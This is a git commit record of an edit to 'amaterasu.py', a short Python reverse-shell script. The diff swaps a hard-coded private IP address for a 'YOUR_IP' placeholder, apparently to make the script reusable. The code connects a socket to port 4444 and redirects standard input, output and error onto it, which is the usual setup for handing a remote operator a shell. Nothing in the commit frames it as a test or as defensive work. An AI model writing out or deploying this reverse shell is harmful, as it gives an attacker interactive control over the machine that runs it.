5139b0f2a9797e60b3266f14d6eb4f20aa2d98d5
Riley Vick <126352951+rjv6261@users.noreply.github.com>
2025-06-18 11:18:12 -0500

    Update amaterasu.py

--- amaterasu.py
+++ amaterasu.py
@@ -1,6 +1,6 @@
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.45.211",4444))
+s.connect(("YOUR_IP",4444))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
